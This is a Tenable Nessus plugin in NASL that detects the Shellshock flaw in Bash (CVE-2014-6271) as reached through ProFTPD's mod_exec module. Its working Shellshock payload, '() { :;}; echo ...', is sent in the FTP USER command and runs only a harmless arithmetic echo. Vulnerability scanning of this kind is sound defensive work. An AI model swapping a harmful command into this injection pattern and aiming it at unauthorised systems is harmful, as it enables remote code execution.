#TRUSTED 0472808d52e3c8acea49514430fa2b60e5fc1800e6ce6cb496c78f62cc2b5a6a6f1653fa2b694df03ab098635dd367565c477886293254df657e530cc658cb2bdf14b6f52680d472caddae34f3cd2f2582d67db322d621089a5384a262a7b3a342a607dbfe6d12efc34144e0f3a6c522afc3e36a3c6c738ca57a43b01ff75c7409db58a34a4ffb42cbd45a4cf5d548e48158c08aee84f28f67fc451fa63ead4a379baabcaa26d18c7b8d8ac052d24a9b74f51d23d14b44579603e206ca411022414dccc97cf0b813fa36e635efee308bc3a5a59d9c1dfecac11475f31ceaf35e9d1d7dee8731ccce27ec3a6cb3687f007268db97e4fb16e0bf10acb4c8c04b23011ca2a08cadd16d8165831b8ff326a0d4730d0eed93fd0392dde47e3d28ea1ad1e66b6c230ac29008760c0d407f21d41e915759ba00ac47dd611e9f0c52611f596e350240138208c9569b98be78c8f260ebd882d818239db3d2c01f078476fa5767079940c610e6bcc56282dd284160a22b910a2d7955065d7aa5a89437860a2e6c874462633f01fc52666d867361412c5e86e2703fbce9830f9541e6a8edc5dfb7be9499db1a3653ef1a242094ce8a6b46d3a3ee260ffaf9409f7774efd8dbda679e971b3e787e308744ca277a1ed20183d005d804be7f5ac59e7f6c0ba954aed1e17f9cba8346707845ce678fd80da94c4f1896faa4ee6fd90ab0abcba5b0
#TRUST-RSA-SHA256 94f8cd57ea3dcf6741e89aec44a2bb43a2129fac6c85a2aa52447a958de2a86269063889f2e2d7970c31f5c31d06f4b5a5364f83bd1bd09c84502abd0fe841f3c525d311f3c31659d4d412b955fd9cfdbd155de897dd763c2931c74157f9dbe50ce913beba2f9a8c9a5ffc7a5bb2073ffe964fd94c3de1ca89e10ec62ffad186c9e631d9e29dcddddfafcf529b6c70ed8c1d0d1d256b111e639a40d3bf5a0d184a90b87cc034f7f3d6f49821336189782c197817b21da1445d5c2034b020f1ab532a838618165949aad4bedadc484450ef55d28df67d459d4917c5d42870951b48e10721dcb4f5e09d974093f09ffe32a44bf22b4f059b722a1554dd5d880d951d6aead9ee3cba1abe67e181873d7ba08bdec53008aed7fbe199305270ff663010038c77603b69e93fef809a24a6fdd43a9dc122f5a26e3460ed9682abd6aed322dca5ff5c85273d8d11f093982c87936bd7231139447c220bcc618a959554c4dfeb0d1e2e3f20a02908882a96c77da11bdd928b44a0718a437cb81ce5a0a1fb833420a1dc48a98392f58bcc3c62ae6d9539e723dd81fe273ab07ed6ce06aadbe7d787311a3cc7bf2fb898669978aa427dbfcbb26f2cac5d2caad5ec5077173d6217be6e7ef39b5b890d18b9d91b2efe9c4cdf0512bacaa7a96869c10194667c4105386f346501cb0442d1b77f4632aa83be9e7e1f7179e68d479de627d48c76
#
# (C) Tenable Network Security, Inc.
#

include('compat.inc');

if (description)
{
  script_id(77986);
  script_version("1.28");
  script_set_attribute(attribute:"plugin_modification_date", value:"2023/04/25");

  script_cve_id("CVE-2014-6271", "CVE-2014-7169");
  script_bugtraq_id(70103, 70137);
  script_xref(name:"CERT", value:"252743");
  script_xref(name:"IAVA", value:"2014-A-0142");
  script_xref(name:"EDB-ID", value:"34765");
  script_xref(name:"EDB-ID", value:"34766");
  script_xref(name:"EDB-ID", value:"34777");
  script_xref(name:"CISA-KNOWN-EXPLOITED", value:"2022/07/28");
  script_xref(name:"CEA-ID", value:"CEA-2019-0240");

  script_name(english:"GNU Bash Environment Variable Handling Code Injection via ProFTPD (Shellshock)");

  script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by a remote code execution
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote FTP server is affected by a remote code execution
vulnerability due to an error in the Bash shell running on the remote
host. A remote, unauthenticated attacker can execute arbitrary code on
the remote host by sending a specially crafted request via the USER
FTP command. The 'mod_exec' module exports the attacker-supplied
username as an environment variable, which is then evaluated by Bash
as code.");
  script_set_attribute(attribute:"see_also", value:"http://www.proftpd.org/docs/contrib/mod_exec.html#ExecEnviron");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/oss-sec/2014/q3/650");
  # https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?dacf7829");
  script_set_attribute(attribute:"see_also", value:"https://www.invisiblethreat.ca/post/shellshock/");
  script_set_attribute(attribute:"solution", value:
"Apply the referenced patch.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:H/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2014-6271");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"exploited_by_malware", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Qmail SMTP Bash Environment Variable Injection (Shellshock)');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"in_the_news", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/09/24");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/09/24");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/09/30");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:gnu:bash");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:proftpd:proftpd");
  script_set_attribute(attribute:"stig_severity", value:"I");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"FTP");

  script_copyright(english:"This script is Copyright (C) 2014-2023 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("ftpserver_detect_type_nd_version.nasl", "ftp_starttls.nasl");
  script_exclude_keys("global_settings/supplied_logins_only");
  script_require_ports("Services/ftp", 21);
  script_timeout(600);

  exit(0);
}

include("audit.inc");
include("byte_func.inc");
include("ftp_func.inc");
include("global_settings.inc");
include("kerberos_func.inc");
include("ldap_func.inc");
include("misc_func.inc");
include("nntp_func.inc");
include("rsync.inc");
include("smtp_func.inc");
include("ssl_funcs.inc");
include("telnet2_func.inc");

port = get_ftp_port(default:21);
if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

function ftp_open(port)
{
  local_var encaps, soc;

  encaps = get_port_transport(port);
  if (encaps > ENCAPS_IP)
  {
    if (get_kb_item("global_settings/disable_test_ssl_based_services"))
      exit(1, "Not testing SSL based services per user config.");
    soc = open_sock_ssl(port, encaps:encaps);
  }
  else soc = open_sock_tcp(port, transport:ENCAPS_IP);
  if (!soc) audit(AUDIT_SOCK_FAIL, port);

  # Discard banner
  ftp_debug(str:"custom banner");
  ftp_recv_line(socket:soc);

  return soc;
}

# Attempt to get the service to echo something back to us, if the
# 'ExecOptions sendStdout' option is set.

echo_injection = '() { :;}; echo "NESSUS-e07ad3ba-$((17 + 12))-59f8d00f4bdf"';
echo_response = 'NESSUS-e07ad3ba-29-59f8d00f4bdf';

socket = ftp_open(port:port);

send(socket:socket, data:"USER " + echo_injection + '\r\n');
res = recv(socket:socket, length:2000, min:2000, timeout:60);

ftp_close(socket:socket);

if (echo_response >< res)
{
  report = NULL;
  if (report_verbosity > 0)
  {
    report =
      '\n' + 'Nessus was able to determine that the remote host is vulnerable to the ' +
      '\n' + 'Shellshock vulnerability by evaluating a simple math equation, injected ' +
      '\n' + 'through the ProFTPD service on port ' + port + '. The service allowed injection ' +
      '\n' + "via the '%U' mod_exec 'cookie'." +
      '\n';
  }
  security_hole(port:port, extra:report);
}
else audit(AUDIT_LISTEN_NOT_VULN, "FTP server", port);
